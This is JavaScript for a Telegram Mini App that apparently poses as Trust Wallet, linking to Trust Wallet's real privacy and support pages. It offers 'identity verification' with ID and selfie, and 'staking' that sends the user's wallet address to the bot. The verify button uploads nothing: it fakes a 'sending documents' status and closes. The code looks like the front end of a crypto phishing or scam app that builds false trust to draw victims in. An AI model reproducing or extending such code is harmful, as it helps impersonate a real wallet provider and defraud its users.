const tg = window.Telegram.WebApp;
tg.expand();

// ============= ПЕРЕВОДЫ =============
const translations = {
    ru: {
        verify_title: "Верификация личности",
        doc_label: "Документ (ID / Паспорт)",
        selfie_label: "Селфи с документом",
        choose_photo: "Выбрать фото",
        take_photo: "Сделать фото",
        send_data: "Отправить данные",
        staking_title: "Стейкинг активов",
        wallet_placeholder: "Адрес кошелька (0x...)",
        connect_wallet: "Подключить кошелек",
        loading: "Загрузка котировок...",
        settings: "Настройки",
        help_support: "Помощь и поддержка",
        language: "Язык",
        privacy: "Политика конфиденциальности",
        support_center: "Центр поддержки",
        support_service: "Служба поддержки",
        statistics: "Статистика",
        market_cap: "Капитализация",
        circulating: "Количество в обращении",
        total_supply: "Общее предложение",
        volume_24h: "Объём (24 ч)"
    },
    en: {
        verify_title: "Identity Verification",
        doc_label: "Document (ID / Passport)",
        selfie_label: "Selfie with document",
        choose_photo: "Choose photo",
        take_photo: "Take photo",
        send_data: "Send data",
        staking_title: "Asset Staking",
        wallet_placeholder: "Wallet address (0x...)",
        connect_wallet: "Connect wallet",
        loading: "Loading quotes...",
        settings: "Settings",
        help_support: "Help & Support",
        language: "Language",
        privacy: "Privacy Policy",
        support_center: "Support Center",
        support_service: "Support Service",
        statistics: "Statistics",
        market_cap: "Market Cap",
        circulating: "Circulating Supply",
        total_supply: "Total Supply",
        volume_24h: "Volume (24h)"
    },
    fr: {
        verify_title: "Vérification d'identité",
        doc_label: "Document (ID / Passeport)",
        selfie_label: "Selfie avec document",
        choose_photo: "Choisir une photo",
        take_photo: "Prendre une photo",
        send_data: "Envoyer les données",
        staking_title: "Staking d'actifs",
        wallet_placeholder: "Adresse du portefeuille (0x...)",
        connect_wallet: "Connecter le portefeuille",
        loading: "Chargement des cotations...",
        settings: "Paramètres",
        help_support: "Aide et support",
        language: "Langue",
        privacy: "Politique de confidentialité",
        support_center: "Centre d'assistance",
        support_service: "Service d'assistance",
        statistics: "Statistiques",
        market_cap: "Capitalisation",
        circulating: "Offre en circulation",
        total_supply: "Offre totale",
        volume_24h: "Volume (24h)"
    },
    de: {
        verify_title: "Identitätsprüfung",
        doc_label: "Dokument (ID / Reisepass)",
        selfie_label: "Selfie mit Dokument",
        choose_photo: "Foto auswählen",
        take_photo: "Foto machen",
        send_data: "Daten senden",
        staking_title: "Asset-Staking",
        wallet_placeholder: "Wallet-Adresse (0x...)",
        connect_wallet: "Wallet verbinden",
        loading: "Kurse werden geladen...",
        settings: "Einstellungen",
        help_support: "Hilfe & Support",
        language: "Sprache",
        privacy: "Datenschutzrichtlinie",
        support_center: "Support-Center",
        support_service: "Support-Service",
        statistics: "Statistiken",
        market_cap: "Marktkapitalisierung",
        circulating: "Umlaufende Menge",
        total_supply: "Gesamtangebot",
        volume_24h: "Volumen (24h)"
    }
};

let currentLang = localStorage.getItem('lang') || 'ru';

function applyLanguage(lang) {
    currentLang = lang;
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (translations[lang][key]) {
            el.textContent = translations[lang][key];
        }
    });
    document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
        const key = el.getAttribute('data-i18n-placeholder');
        if (translations[lang][key]) {
            el.placeholder = translations[lang][key];
        }
    });
}

// Применяем язык при загрузке
applyLanguage(currentLang);
document.querySelectorAll('input[name="lang"]').forEach(radio => {
    if (radio.value === currentLang) radio.checked = true;
    radio.addEventListener('change', (e) => {
        localStorage.setItem('lang', e.target.value);
        applyLanguage(e.target.value);
    });
});

// ============= НАВИГАЦИЯ =============
function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(screenId).classList.add('active');
}

document.getElementById('settingsBtn').onclick = () => showScreen('settingsScreen');
document.getElementById('backFromSettings').onclick = () => showScreen('mainScreen');
document.getElementById('helpBtn').onclick = () => showScreen('helpScreen');
document.getElementById('backFromHelp').onclick = () => showScreen('settingsScreen');
document.getElementById('langBtn').onclick = () => showScreen('langScreen');
document.getElementById('backFromLang').onclick = () => showScreen('settingsScreen');
document.getElementById('backFromCoin').onclick = () => showScreen('mainScreen');

// Открытие ссылок
document.getElementById('privacyBtn').onclick = () => {
    const url = currentLang === 'ru' 
        ? 'https://trustwallet.com/ru/privacy-notice'
        : 'https://trustwallet.com/privacy-notice';
    tg.openLink(url);
};
document.getElementById('supportCenterBtn').onclick = () => tg.openLink('https://support.trustwallet.com/support/home');
document.getElementById('supportServiceBtn').onclick = () => {
    const url = currentLang === 'ru'
        ? 'https://trustwallet.com/ru/blog/guides/beginners-guide-to-trust-wallet-browser-extension'
        : 'https://trustwallet.com/blog/guides/beginners-guide-to-trust-wallet-browser-extension';
    tg.openLink(url);
};

// ============= УВЕДОМЛЕНИЯ =============
function showStatus(msg) {
    const s = document.getElementById('status');
    s.textContent = msg;
    s.classList.remove('hidden');
    setTimeout(() => s.classList.add('hidden'), 3000);
}

// ============= КНОПКИ =============
document.getElementById('verifyBtn').onclick = () => {
    showStatus("⏳ Отправка документов...");
    setTimeout(() => {
        tg.sendData(JSON.stringify({action: "verify", status: "processing"}));
        tg.close();
    }, 1500);
};

document.getElementById('stakingBtn').onclick = () => {
    const wallet = document.getElementById('walletInput').value;
    if(wallet.length < 10) return showStatus("❌ Введите адрес");
    tg.sendData(JSON.stringify({action: "staking", wallet: wallet}));
    showStatus("⏳ Подключение...");
    setTimeout(() => tg.close(), 1500);
};

// ============= ТОКЕНЫ =============
const tokensList = document.getElementById('tokensList');
let coinsData = [];

async function getPrices() {
    try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,binancecoin,solana,tron&order=market_cap_desc');
        coinsData = await res.json();
        tokensList.innerHTML = '';
        coinsData.forEach(coin => {
            const isNeg = coin.price_change_percentage_24h < 0;
            const row = document.createElement('div');
            row.className = 'token-row';
            row.onclick = () => showCoinDetail(coin.id);
            row.innerHTML = `
                <img src="${coin.image}" class="token-icon">
                <div class="token-info">
                    <div class="token-name">${coin.symbol.toUpperCase()}</div>
                    <div class="token-mcap">MCap: ${(coin.market_cap/1e9).toFixed(1)}B</div>
                </div>
                <div class="token-stats">
                    <div class="token-price">$${coin.current_price.toLocaleString()}</div>
                    <div class="token-change ${isNeg ? 'neg' : 'pos'}">
                        ${isNeg ? '' : '+'}${coin.price_change_percentage_24h.toFixed(2)}%
                    </div>
                </div>`;
            tokensList.appendChild(row);
        });
    } catch (e) { 
        tokensList.innerHTML = '<div class="loading">Ошибка сети</div>'; 
    }
}

getPrices();
setInterval(getPrices, 30000); // Обновление каждые 30 секунд

// ============= ДЕТАЛЬНАЯ СТРАНИЦА МОНЕТЫ =============
let currentCoinId = '';
let currentPeriod = '24';

async function showCoinDetail(coinId) {
    currentCoinId = coinId;
    showScreen('coinScreen');
    
    try {
        const res = await fetch(`https://api.coingecko.com/api/v3/coins/${coinId}`);
        const data = await res.json();
        
        document.getElementById('coinName').textContent = data.name;
        document.getElementById('coinPrice').textContent = `$${data.market_data.current_price.usd.toLocaleString()}`;
        
        const change = data.market_data.price_change_percentage_24h;
        const isNeg = change < 0;
        document.getElementById('coinChange').textContent = `${isNeg ? '' : '+'}${change.toFixed(2)}%`;
        document.getElementById('coinChange').className = `coin-change ${isNeg ? 'neg' : 'pos'}`;
        
        document.getElementById('statMcap').textContent = `$${(data.market_data.market_cap.usd / 1e9).toFixed(2)}B`;
        document.getElementById('statCirc').textContent = `${(data.market_data.circulating_supply / 1e6).toFixed(2)}M ${data.symbol.toUpperCase()}`;
        document.getElementById('statSupply').textContent = data.market_data.total_supply 
            ? `${(data.market_data.total_supply / 1e6).toFixed(2)}M ${data.symbol.toUpperCase()}`
            : '—';
        document.getElementById('statVol').textContent = `$${(data.market_data.total_volume.usd / 1e9).toFixed(2)}B`;
        
        loadChart(coinId, currentPeriod);
    } catch (e) {
        console.error(e);
    }
}

function loadChart(coinId, days) {
    currentPeriod = days;
    const chartImg = document.getElementById('coinChart');
    chartImg.src = `https://www.coingecko.com/coins/${coinId}/sparkline.svg?period=${days}d`;
    
    document.querySelectorAll('.period-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.getAttribute('data-period') === days) {
            btn.classList.add('active');
        }
    });
}

document.querySelectorAll('.period-btn').forEach(btn => {
    btn.onclick = () => {
        const period = btn.getAttribute('data-period');
        loadChart(currentCoinId, period);
    };
});
